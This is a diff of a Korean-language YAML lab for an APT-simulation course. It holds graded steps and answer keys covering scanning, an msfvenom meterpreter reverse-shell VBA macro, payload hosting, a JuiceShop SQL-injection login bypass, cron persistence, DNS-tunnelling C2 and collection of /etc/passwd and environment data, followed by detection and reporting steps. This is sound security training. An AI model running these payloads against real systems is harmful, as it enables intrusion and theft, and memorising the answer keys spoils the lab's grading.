@@ -1,157 +1,195 @@
-lab_id: "battle-adv-nonai-week01"
-title: "APT 시뮬레이션 기초 — 지능형 지속 위협 공격 체인"
-version: "non-ai"
-course: "battle-adv-nonai"
+lab_id: battle-adv-nonai-week01
+title: APT 시뮬레이션 기초 — 지능형 지속 위협 공격 체인
+version: non-ai
+course: battle-adv-nonai
 week: 1
-description: "APT(Advanced Persistent Threat) 공격의 전체 킬체인을 이해하고, 각 단계별 기법을 수동으로 시뮬레이션하며 탐지 포인트를 식별한다. MITRE ATT&CK 프레임워크 기반으로 공격 체인을 매핑하고 방어 전략을 수립한다."
-difficulty: "hard"
+description: APT(Advanced Persistent Threat) 공격의 전체 킬체인을 이해하고, 각 단계별 기법을 수동으로 시뮬레이션하며 탐지 포인트를 식별한다. MITRE ATT&CK 프레임워크 기반으로 공격 체인을 매핑하고 방어 전략을 수립한다.
+difficulty: hard
 duration_minutes: 150
 objectives:
-  - "APT 킬체인 7단계를 이해하고 각 단계별 기법을 실습한다"
-  - "MITRE ATT&CK 매트릭스에 공격 기법을 매핑한다"
-  - "각 킬체인 단계에서의 탐지 포인트를 식별한다"
-  - "APT 그룹의 TTP(Tactics, Techniques, Procedures)를 분석한다"
+- APT 킬체인 7단계를 이해하고 각 단계별 기법을 실습한다
+- MITRE ATT&CK 매트릭스에 공격 기법을 매핑한다
+- 각 킬체인 단계에서의 탐지 포인트를 식별한다
+- APT 그룹의 TTP(Tactics, Techniques, Procedures)를 분석한다
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "MITRE ATT&CK 프레임워크에서 APT29(Cozy Bear)가 사용하는 Initial Access 기법을 조회하라. curl을 사용하여 ATT&CK TAXII 서버에서 APT29 관련 데이터를 가져오라."
-    hint: "ATT&CK TAXII 서버 주소는 cti-taxii.mitre.org이며, intrusion-set 컬렉션을 조회한다."
-    category: "recon"
-    points: 10
-    answer: "curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/intrusion-set/intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542.json | python3 -m json.tool | grep -i 'initial access'"
-    answer_detail: "APT29는 Spearphishing Link(T1566.002), Valid Accounts(T1078), Supply Chain Compromise(T1195) 등을 Initial Access에 사용한다. MITRE ATT&CK의 CTI 저장소에서 intrusion-set 데이터를 조회하면 해당 그룹의 TTP 전체를 확인할 수 있다."
-    verify:
-      type: "output_contains"
-      expect: "initial"
+- order: 1
+  instruction: MITRE ATT&CK 프레임워크에서 APT29(Cozy Bear)가 사용하는 Initial Access 기법을 조회하라. curl을 사용하여 ATT&CK TAXII 서버에서 APT29 관련 데이터를 가져오라.
+  hint: ATT&CK TAXII 서버 주소는 cti-taxii.mitre.org이며, intrusion-set 컬렉션을 조회한다.
+  category: recon
+  points: 10
+  answer: curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/intrusion-set/intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542.json | python3 -m json.tool | grep -i 'initial access'
+  answer_detail: APT29는 Spearphishing Link(T1566.002), Valid Accounts(T1078), Supply Chain Compromise(T1195) 등을 Initial Access에 사용한다. MITRE ATT&CK의 CTI 저장소에서 intrusion-set 데이터를 조회하면 해당 그룹의 TTP 전체를 확인할 수
+    있다.
+  verify:
+    type: output_contains
+    expect: initial
+  target_vm: attacker
+- order: 2
+  instruction: Nmap을 이용하여 타겟 네트워크 10.20.30.0/24에서 서비스 배너와 OS를 동시에 탐지하라. 스텔스 스캔(-sS)과 서비스 버전 탐지(-sV)를 결합하라.
+  hint: -sS -sV -O 옵션을 조합하고, --script=banner도 추가한다.
+  category: recon
+  points: 10
+  answer: nmap -sS -sV -O --script=banner -T3 10.20.30.0/24 -oX /tmp/apt_recon.xml
+  answer_detail: APT 시뮬레이션의 첫 단계인 Reconnaissance에서는 타겟 네트워크의 서비스, OS, 버전 정보를 수집한다. -sS(SYN 스캔)는 TCP 3-way handshake를 완료하지 않아 로그에 남기 어렵고, -sV는 서비스 버전을, -O는 OS를 탐지한다.
+  verify:
+    type: output_contains
+    expect: open
+  target_vm: attacker
+- order: 3
+  instruction: 수집된 정보를 기반으로 타겟 10.20.30.80의 웹 서버에 대해 웹 취약점 스캔을 수행하라. nikto를 사용하여 알려진 취약점을 식별하라.
+  hint: nikto -h 옵션으로 타겟 호스트를 지정하고, -output으로 결과를 저장한다.
+  category: recon
+  points: 10
+  answer: nikto -h http://10.20.30.80 -output /tmp/nikto_scan.txt -Format txt
+  answer_detail: Weaponization 단계에서 활용할 취약점을 식별하기 위해 nikto로 웹 서버를 스캔한다. nikto는 6,700개 이상의 잠재적 위험 파일/CGI와 1,250개 이상의 서버 버전별 취약점을 검사한다.
+  verify:
+    type: output_contains
+    expect: nikto
+  target_vm: attacker
+- order: 4
+  instruction: Spearphishing 이메일에 첨부할 악성 Office 문서를 시뮬레이션하라. msfvenom으로 reverse shell 페이로드가 포함된 VBA 매크로를 생성하라. (교육 목적 - 실제 전송 금지)
+  hint: msfvenom -p windows/meterpreter/reverse_tcp 옵션으로 VBA 매크로 형태를 생성한다.
+  category: exploit
+  points: 10
+  answer: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f vba -o /tmp/apt_macro.vba
+  answer_detail: APT 킬체인의 Weaponization 단계에서 공격자는 취약점을 exploit할 수 있는 페이로드를 제작한다. VBA 매크로는 가장 흔한 Delivery 벡터 중 하나이며, T1566.001(Spearphishing Attachment)에 해당한다. 실습에서는 생성만 하고 실제 전송하지 않는다.
+  verify:
+    type: output_contains
+    expect: vba
+  target_vm: attacker
+- order: 5
+  instruction: Delivery 단계를 시뮬레이션하기 위해 간이 피싱 서버를 구축하라. Python http.server로 페이로드 호스팅 서버를 만들고, 접속 로그를 기록하라.
+  hint: python3 -m http.server로 서버를 실행하고, 특정 디렉토리를 서빙한다.
+  category: exploit
+  points: 10
+  answer: mkdir -p /tmp/phishing_sim && cp /tmp/apt_macro.vba /tmp/phishing_sim/ && cd /tmp/phishing_sim && python3 -m http.server 8888 --bind 10.20.30.201 > /tmp/phishing_access.log 2>&1 &
+  answer_detail: APT의 Delivery 단계에서 공격자는 피싱 이메일, 워터링홀, USB 드롭 등의 방법으로 페이로드를 전달한다. 이 실습에서는 간이 HTTP 서버로 페이로드 호스팅을 시뮬레이션한다. 실제 APT 공격에서는 CDN이나 정상 도메인을 악용하여 탐지를 회피한다.
+  verify:
+    type: output_contains
+    expect: '8888'
+  target_vm: attacker
+- order: 6
+  instruction: Exploitation 단계를 시뮬레이션하라. 타겟 웹 서버 10.20.30.80에서 발견된 취약점을 이용하여 초기 접근을 확보하라. curl을 이용한 SQL Injection 테스트를 수행하라.
+  hint: OWASP JuiceShop의 로그인 엔드포인트에 SQL Injection을 시도한다.
+  category: exploit
+  points: 10
+  answer: 'curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"test"}'' | python3 -m json.tool'
+  answer_detail: Exploitation 단계에서 공격자는 식별된 취약점을 이용하여 시스템에 접근한다. SQL Injection(T1190)은 가장 흔한 웹 취약점 중 하나로, JuiceShop의 로그인 폼에 SQL 구문을 삽입하여 인증을 우회한다. APT29는 웹 애플리케이션 취약점을 적극 활용한다.
+  verify:
+    type: output_contains
+    expect: token
+  target_vm: attacker
+- order: 7
+  instruction: Installation(Persistence) 단계를 시뮬레이션하라. 타겟 시스템에서 crontab을 이용한 지속성 확보 기법을 테스트하라. (로컬 실습)
+  hint: crontab에 리버스 쉘 명령을 등록하는 방식으로 시뮬레이션한다.
+  category: exploit
+  points: 10
+  answer: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"' | crontab -
+  answer_detail: APT의 Installation 단계에서 공격자는 시스템 재부팅 후에도 접근을 유지하기 위한 Persistence 메커니즘을 설치한다. crontab(T1053.003), systemd service(T1543.002), .bashrc 수정(T1546.004) 등이 대표적이다. 실습에서는 무해한 echo 명령으로 시뮬레이션한다.
+  verify:
+    type: output_contains
+    expect: APT_PERSISTENCE
+  target_vm: attacker
+- order: 8
+  instruction: C2(Command & Control) 채널을 시뮬레이션하라. DNS 기반 C2 통신을 모방하여, nslookup으로 인코딩된 데이터를 DNS 쿼리에 포함하여 전송하는 원리를 테스트하라.
+  hint: base64로 데이터를 인코딩한 후 서브도메인으로 구성하여 DNS 쿼리를 보낸다.
+  category: exploit
+  points: 10
+  answer: echo 'APT_C2_DATA' | base64 | tr -d '=' | xargs -I{} nslookup {}.test.local 2>&1 | head -5
+  answer_detail: APT 공격에서 C2 채널은 공격자가 침투한 시스템을 원격 제어하는 통로이다. DNS 기반 C2(T1071.004)는 DNS 프로토콜이 대부분의 방화벽에서 허용되므로 탐지가 어렵다. 데이터를 base64 인코딩하여 DNS 쿼리의 서브도메인에 포함시키는 방식이 대표적이다.
+  verify:
+    type: output_contains
+    expect: QVBU
+  target_vm: attacker
+- order: 9
+  instruction: Actions on Objectives 단계를 시뮬레이션하라. 타겟 시스템에서 민감 데이터를 수집하는 과정을 테스트하라. /etc/passwd, 환경변수, 네트워크 설정을 수집하여 하나의 파일로 만들어라.
+  hint: cat, env, ip addr 명령의 출력을 하나의 파일로 리다이렉트한다.
+  category: exploit
+  points: 10
+  answer: cat /etc/passwd > /tmp/apt_exfil.txt && env >> /tmp/apt_exfil.txt && ip addr >> /tmp/apt_exfil.txt && wc -l /tmp/apt_exfil.txt
+  answer_detail: APT의 최종 단계인 Actions on Objectives에서 공격자는 목적을 달성한다. 데이터 수집(T1005), 자격 증명 덤프(T1003), 내부 정찰(T1087) 등이 포함된다. 이 실습에서는 시스템 정보를 수집하는 과정을 시뮬레이션한다.
+  verify:
+    type: output_contains
+    expect: /tmp/apt_exfil.txt
+  target_vm: attacker
+- order: 10
+  instruction: APT 킬체인의 각 단계에서 발생하는 로그를 분석하라. /var/log/auth.log에서 비정상 인증 시도 패턴을 찾아라.
+  hint: grep으로 Failed, Accepted, session opened 등의 패턴을 검색한다.
+  category: defense
+  points: 10
+  answer: grep -E '(Failed|Accepted|session opened|session closed|Invalid user)' /var/log/auth.log | tail -30
+  answer_detail: APT 탐지에서 로그 분석은 핵심이다. auth.log에서 Failed password(브루트포스 시도), Invalid user(계정 열거), Accepted publickey(정상 인증), session opened(세션 시작) 패턴을 분석하여 비정상 활동을 식별한다.
+  verify:
+    type: output_contains
+    expect: session
+  target_vm: attacker
+- order: 11
+  instruction: Suricata IDS에서 APT 관련 탐지 규칙을 확인하라. 10.20.30.1의 Suricata 규칙 파일에서 APT, C2, exfiltration 관련 시그니처를 검색하라.
+  hint: Suricata 규칙 디렉토리(/etc/suricata/rules/)에서 관련 키워드를 검색한다.
+  category: defense
+  points: 10
+  answer: ssh 10.20.30.1 'grep -rn -i "apt\|c2\|exfil\|cozy\|beacon" /etc/suricata/rules/ 2>/dev/null | head -20'
+  answer_detail: Suricata IDS는 네트워크 트래픽에서 알려진 APT 공격 패턴을 탐지한다. ET(Emerging Threats) 규칙셋에는 APT 그룹별 시그니처, C2 비컨 패턴, 데이터 유출 패턴 등이 포함되어 있다. 규칙 분석을 통해 어떤 공격이 탐지 가능한지 파악한다.
+  verify:
+    type: output_contains
+    expect: alert
+  target_vm: attacker
+- order: 12
+  instruction: MITRE ATT&CK Navigator를 이용하여 이번 실습에서 사용한 기법들을 매핑하라. JSON 형태로 ATT&CK 레이어 파일을 생성하라.
+  hint: ATT&CK Navigator의 레이어 JSON 포맷에 맞춰 technique_id와 score를 지정한다.
+  category: analysis
+  points: 10
+  answer: 'cat > /tmp/apt_attack_layer.json << ''EOF''
 
-  - order: 2
-    instruction: "Nmap을 이용하여 타겟 네트워크 10.20.30.0/24에서 서비스 배너와 OS를 동시에 탐지하라. 스텔스 스캔(-sS)과 서비스 버전 탐지(-sV)를 결합하라."
-    hint: "-sS -sV -O 옵션을 조합하고, --script=banner도 추가한다."
-    category: "recon"
-    points: 10
-    answer: "nmap -sS -sV -O --script=banner -T3 10.20.30.0/24 -oX /tmp/apt_recon.xml"
-    answer_detail: "APT 시뮬레이션의 첫 단계인 Reconnaissance에서는 타겟 네트워크의 서비스, OS, 버전 정보를 수집한다. -sS(SYN 스캔)는 TCP 3-way handshake를 완료하지 않아 로그에 남기 어렵고, -sV는 서비스 버전을, -O는 OS를 탐지한다."
-    verify:
-      type: "output_contains"
-      expect: "open"
+    {"name":"APT Simulation Lab","versions":{"attack":"14","navigator":"4.9","layer":"4.5"},"domain":"enterprise-attack","techniques":[{"techniqueID":"T1595","score":1,"comment":"Active Scanning"},{"techniqueID":"T1566.001","score":1,"comment":"Spearphishing
+    Attachment"},{"techniqueID":"T1190","score":1,"comment":"Exploit Public-Facing App"},{"techniqueID":"T1053.003","score":1,"comment":"Cron Persistence"},{"techniqueID":"T1071.004","score":1,"comment":"DNS
+    C2"},{"techniqueID":"T1005","score":1,"comment":"Data from Local System"}]}
 
-  - order: 3
-    instruction: "수집된 정보를 기반으로 타겟 10.20.30.80의 웹 서버에 대해 웹 취약점 스캔을 수행하라. nikto를 사용하여 알려진 취약점을 식별하라."
-    hint: "nikto -h 옵션으로 타겟 호스트를 지정하고, -output으로 결과를 저장한다."
-    category: "recon"
-    points: 10
-    answer: "nikto -h http://10.20.30.80 -output /tmp/nikto_scan.txt -Format txt"
-    answer_detail: "Weaponization 단계에서 활용할 취약점을 식별하기 위해 nikto로 웹 서버를 스캔한다. nikto는 6,700개 이상의 잠재적 위험 파일/CGI와 1,250개 이상의 서버 버전별 취약점을 검사한다."
-    verify:
-      type: "output_contains"
-      expect: "nikto"
+    EOF
 
-  - order: 4
-    instruction: "Spearphishing 이메일에 첨부할 악성 Office 문서를 시뮬레이션하라. msfvenom으로 reverse shell 페이로드가 포함된 VBA 매크로를 생성하라. (교육 목적 - 실제 전송 금지)"
-    hint: "msfvenom -p windows/meterpreter/reverse_tcp 옵션으로 VBA 매크로 형태를 생성한다."
-    category: "exploit"
-    points: 10
-    answer: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f vba -o /tmp/apt_macro.vba"
-    answer_detail: "APT 킬체인의 Weaponization 단계에서 공격자는 취약점을 exploit할 수 있는 페이로드를 제작한다. VBA 매크로는 가장 흔한 Delivery 벡터 중 하나이며, T1566.001(Spearphishing Attachment)에 해당한다. 실습에서는 생성만 하고 실제 전송하지 않는다."
-    verify:
-      type: "output_contains"
-      expect: "vba"
+    cat /tmp/apt_attack_layer.json | python3 -m json.tool'
+  answer_detail: MITRE ATT&CK Navigator는 공격 기법을 시각적으로 매핑하는 도구이다. JSON 레이어 파일을 생성하여 이번 실습에서 사용한 기법(Reconnaissance→Weaponization→Delivery→Exploitation→Installation→C2→Actions)을 ATT&CK 매트릭스에 매핑한다.
+  verify:
+    type: output_contains
+    expect: enterprise-attack
+  target_vm: attacker
+- order: 13
+  instruction: 실습 환경을 정리하고 킬체인 분석 보고서를 작성하라. crontab과 임시 파일을 제거한 후, 각 킬체인 단계의 기법, MITRE ATT&CK 매핑, 탐지 포인트를 /tmp/apt_killchain_report.txt에 정리하라.
+  hint: crontab -r로 크론탭을 초기화하고, 킬체인 7단계를 ATT&CK ID와 매핑한다.
+  category: analysis
+  points: 15
+  answer: 'crontab -r 2>/dev/null; kill $(lsof -ti:8888) 2>/dev/null; rm -f /tmp/apt_*.txt /tmp/apt_*.vba /tmp/phishing_sim/* 2>/dev/null && cat > /tmp/apt_killchain_report.txt << ''EOF''
 
-  - order: 5
-    instruction: "Delivery 단계를 시뮬레이션하기 위해 간이 피싱 서버를 구축하라. Python http.server로 페이로드 호스팅 서버를 만들고, 접속 로그를 기록하라."
-    hint: "python3 -m http.server로 서버를 실행하고, 특정 디렉토리를 서빙한다."
-    category: "exploit"
-    points: 10
-    answer: "mkdir -p /tmp/phishing_sim && cp /tmp/apt_macro.vba /tmp/phishing_sim/ && cd /tmp/phishing_sim && python3 -m http.server 8888 --bind 10.20.30.201 > /tmp/phishing_access.log 2>&1 &"
-    answer_detail: "APT의 Delivery 단계에서 공격자는 피싱 이메일, 워터링홀, USB 드롭 등의 방법으로 페이로드를 전달한다. 이 실습에서는 간이 HTTP 서버로 페이로드 호스팅을 시뮬레이션한다. 실제 APT 공격에서는 CDN이나 정상 도메인을 악용하여 탐지를 회피한다."
-    verify:
-      type: "output_contains"
-      expect: "8888"
+    === APT Kill Chain Analysis Report ===
 
-  - order: 6
-    instruction: "Exploitation 단계를 시뮬레이션하라. 타겟 웹 서버 10.20.30.80에서 발견된 취약점을 이용하여 초기 접근을 확보하라. curl을 이용한 SQL Injection 테스트를 수행하라."
-    hint: "OWASP JuiceShop의 로그인 엔드포인트에 SQL Injection을 시도한다."
-    category: "exploit"
-    points: 10
-    answer: "curl -s -X POST http://10.20.30.80/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' OR 1=1--\",\"password\":\"test\"}' | python3 -m json.tool"
-    answer_detail: "Exploitation 단계에서 공격자는 식별된 취약점을 이용하여 시스템에 접근한다. SQL Injection(T1190)은 가장 흔한 웹 취약점 중 하나로, JuiceShop의 로그인 폼에 SQL 구문을 삽입하여 인증을 우회한다. APT29는 웹 애플리케이션 취약점을 적극 활용한다."
-    verify:
-      type: "output_contains"
-      expect: "token"
+    Date: 2026-04-06
 
-  - order: 7
-    instruction: "Installation(Persistence) 단계를 시뮬레이션하라. 타겟 시스템에서 crontab을 이용한 지속성 확보 기법을 테스트하라. (로컬 실습)"
-    hint: "crontab에 리버스 쉘 명령을 등록하는 방식으로 시뮬레이션한다."
-    category: "exploit"
-    points: 10
-    answer: "echo '*/5 * * * * /bin/bash -c \"echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt\"' | crontab -"
-    answer_detail: "APT의 Installation 단계에서 공격자는 시스템 재부팅 후에도 접근을 유지하기 위한 Persistence 메커니즘을 설치한다. crontab(T1053.003), systemd service(T1543.002), .bashrc 수정(T1546.004) 등이 대표적이다. 실습에서는 무해한 echo 명령으로 시뮬레이션한다."
-    verify:
-      type: "output_contains"
-      expect: "APT_PERSISTENCE"
+    Target: 10.20.30.0/24
 
-  - order: 8
-    instruction: "C2(Command & Control) 채널을 시뮬레이션하라. DNS 기반 C2 통신을 모방하여, nslookup으로 인코딩된 데이터를 DNS 쿼리에 포함하여 전송하는 원리를 테스트하라."
-    hint: "base64로 데이터를 인코딩한 후 서브도메인으로 구성하여 DNS 쿼리를 보낸다."
-    category: "exploit"
-    points: 10
-    answer: "echo 'APT_C2_DATA' | base64 | tr -d '=' | xargs -I{} nslookup {}.test.local 2>&1 | head -5"
-    answer_detail: "APT 공격에서 C2 채널은 공격자가 침투한 시스템을 원격 제어하는 통로이다. DNS 기반 C2(T1071.004)는 DNS 프로토콜이 대부분의 방화벽에서 허용되므로 탐지가 어렵다. 데이터를 base64 인코딩하여 DNS 쿼리의 서브도메인에 포함시키는 방식이 대표적이다."
-    verify:
-      type: "output_contains"
-      expect: "QVBU"
 
-  - order: 9
-    instruction: "Actions on Objectives 단계를 시뮬레이션하라. 타겟 시스템에서 민감 데이터를 수집하는 과정을 테스트하라. /etc/passwd, 환경변수, 네트워크 설정을 수집하여 하나의 파일로 만들어라."
-    hint: "cat, env, ip addr 명령의 출력을 하나의 파일로 리다이렉트한다."
-    category: "exploit"
-    points: 10
-    answer: "cat /etc/passwd > /tmp/apt_exfil.txt && env >> /tmp/apt_exfil.txt && ip addr >> /tmp/apt_exfil.txt && wc -l /tmp/apt_exfil.txt"
-    answer_detail: "APT의 최종 단계인 Actions on Objectives에서 공격자는 목적을 달성한다. 데이터 수집(T1005), 자격 증명 덤프(T1003), 내부 정찰(T1087) 등이 포함된다. 이 실습에서는 시스템 정보를 수집하는 과정을 시뮬레이션한다."
-    verify:
-      type: "output_contains"
-      expect: "/tmp/apt_exfil.txt"
+    1. Reconnaissance (T1595): Nmap SYN+Version scan -> Detect: IDS port scan rule -> Defend: Minimize ports
 
-  - order: 10
-    instruction: "APT 킬체인의 각 단계에서 발생하는 로그를 분석하라. /var/log/auth.log에서 비정상 인증 시도 패턴을 찾아라."
-    hint: "grep으로 Failed, Accepted, session opened 등의 패턴을 검색한다."
-    category: "defense"
-    points: 10
-    answer: "grep -E '(Failed|Accepted|session opened|session closed|Invalid user)' /var/log/auth.log | tail -30"
-    answer_detail: "APT 탐지에서 로그 분석은 핵심이다. auth.log에서 Failed password(브루트포스 시도), Invalid user(계정 열거), Accepted publickey(정상 인증), session opened(세션 시작) 패턴을 분석하여 비정상 활동을 식별한다."
-    verify:
-      type: "output_contains"
-      expect: "session"
+    2. Weaponization (T1587): VBA Macro generation -> Detect: Sandbox analysis -> Defend: Disable macros
 
-  - order: 11
-    instruction: "Suricata IDS에서 APT 관련 탐지 규칙을 확인하라. 10.20.30.1의 Suricata 규칙 파일에서 APT, C2, exfiltration 관련 시그니처를 검색하라."
-    hint: "Suricata 규칙 디렉토리(/etc/suricata/rules/)에서 관련 키워드를 검색한다."
-    category: "defense"
-    points: 10
-    answer: "ssh 10.20.30.1 'grep -rn -i \"apt\\|c2\\|exfil\\|cozy\\|beacon\" /etc/suricata/rules/ 2>/dev/null | head -20'"
-    answer_detail: "Suricata IDS는 네트워크 트래픽에서 알려진 APT 공격 패턴을 탐지한다. ET(Emerging Threats) 규칙셋에는 APT 그룹별 시그니처, C2 비컨 패턴, 데이터 유출 패턴 등이 포함되어 있다. 규칙 분석을 통해 어떤 공격이 탐지 가능한지 파악한다."
-    verify:
-      type: "output_contains"
-      expect: "alert"
+    3. Delivery (T1566.001): HTTP phishing server -> Detect: URL filtering -> Defend: Email security gateway
 
-  - order: 12
-    instruction: "MITRE ATT&CK Navigator를 이용하여 이번 실습에서 사용한 기법들을 매핑하라. JSON 형태로 ATT&CK 레이어 파일을 생성하라."
-    hint: "ATT&CK Navigator의 레이어 JSON 포맷에 맞춰 technique_id와 score를 지정한다."
-    category: "analysis"
-    points: 10
-    answer: "cat > /tmp/apt_attack_layer.json << 'EOF'\n{\"name\":\"APT Simulation Lab\",\"versions\":{\"attack\":\"14\",\"navigator\":\"4.9\",\"layer\":\"4.5\"},\"domain\":\"enterprise-attack\",\"techniques\":[{\"techniqueID\":\"T1595\",\"score\":1,\"comment\":\"Active Scanning\"},{\"techniqueID\":\"T1566.001\",\"score\":1,\"comment\":\"Spearphishing Attachment\"},{\"techniqueID\":\"T1190\",\"score\":1,\"comment\":\"Exploit Public-Facing App\"},{\"techniqueID\":\"T1053.003\",\"score\":1,\"comment\":\"Cron Persistence\"},{\"techniqueID\":\"T1071.004\",\"score\":1,\"comment\":\"DNS C2\"},{\"techniqueID\":\"T1005\",\"score\":1,\"comment\":\"Data from Local System\"}]}\nEOF\ncat /tmp/apt_attack_layer.json | python3 -m json.tool"
-    answer_detail: "MITRE ATT&CK Navigator는 공격 기법을 시각적으로 매핑하는 도구이다. JSON 레이어 파일을 생성하여 이번 실습에서 사용한 기법(Reconnaissance→Weaponization→Delivery→Exploitation→Installation→C2→Actions)을 ATT&CK 매트릭스에 매핑한다."
-    verify:
-      type: "output_contains"
-      expect: "enterprise-attack"
+    4. Exploitation (T1190): SQL Injection -> Detect: WAF logs -> Defend: Parameterized queries
 
-  - order: 13
-    instruction: "실습 환경을 정리하고 킬체인 분석 보고서를 작성하라. crontab과 임시 파일을 제거한 후, 각 킬체인 단계의 기법, MITRE ATT&CK 매핑, 탐지 포인트를 /tmp/apt_killchain_report.txt에 정리하라."
-    hint: "crontab -r로 크론탭을 초기화하고, 킬체인 7단계를 ATT&CK ID와 매핑한다."
-    category: "analysis"
-    points: 15
-    answer: "crontab -r 2>/dev/null; kill $(lsof -ti:8888) 2>/dev/null; rm -f /tmp/apt_*.txt /tmp/apt_*.vba /tmp/phishing_sim/* 2>/dev/null && cat > /tmp/apt_killchain_report.txt << 'EOF'\n=== APT Kill Chain Analysis Report ===\nDate: 2026-04-06\nTarget: 10.20.30.0/24\n\n1. Reconnaissance (T1595): Nmap SYN+Version scan -> Detect: IDS port scan rule -> Defend: Minimize ports\n2. Weaponization (T1587): VBA Macro generation -> Detect: Sandbox analysis -> Defend: Disable macros\n3. Delivery (T1566.001): HTTP phishing server -> Detect: URL filtering -> Defend: Email security gateway\n4. Exploitation (T1190): SQL Injection -> Detect: WAF logs -> Defend: Parameterized queries\n5. Installation (T1053.003): Crontab Persistence -> Detect: crontab monitoring -> Defend: Cron whitelist\n6. C2 (T1071.004): DNS-based C2 -> Detect: DNS anomaly -> Defend: DNS filtering\n7. Actions (T1005): Data collection & exfil -> Detect: DLP -> Defend: Data classification\n\nConclusion: Defense-in-Depth is essential - every kill chain stage offers a detection opportunity.\nEOF\ncat /tmp/apt_killchain_report.txt && echo '--- Cleanup completed ---'"
-    answer_detail: "APT 시뮬레이션 후에는 환경 복원(Persistence 제거, 임시 파일 삭제)과 결과 문서화를 수행한다. 킬체인 각 단계의 ATT&CK 매핑과 탐지/방어 포인트를 정리하여 실무에서 활용 가능한 보고서를 작성한다."
-    verify:
-      type: "output_contains"
-      expect: "Kill Chain Analysis"
+    5. Installation (T1053.003): Crontab Persistence -> Detect: crontab monitoring -> Defend: Cron whitelist
+
+    6. C2 (T1071.004): DNS-based C2 -> Detect: DNS anomaly -> Defend: DNS filtering
+
+    7. Actions (T1005): Data collection & exfil -> Detect: DLP -> Defend: Data classification
+
+
+    Conclusion: Defense-in-Depth is essential - every kill chain stage offers a detection opportunity.
+
+    EOF
+
+    cat /tmp/apt_killchain_report.txt && echo ''--- Cleanup completed ---'''
+  answer_detail: APT 시뮬레이션 후에는 환경 복원(Persistence 제거, 임시 파일 삭제)과 결과 문서화를 수행한다. 킬체인 각 단계의 ATT&CK 매핑과 탐지/방어 포인트를 정리하여 실무에서 활용 가능한 보고서를 작성한다.
+  verify:
+    type: output_contains
+    expect: Kill Chain Analysis
+  target_vm: attacker
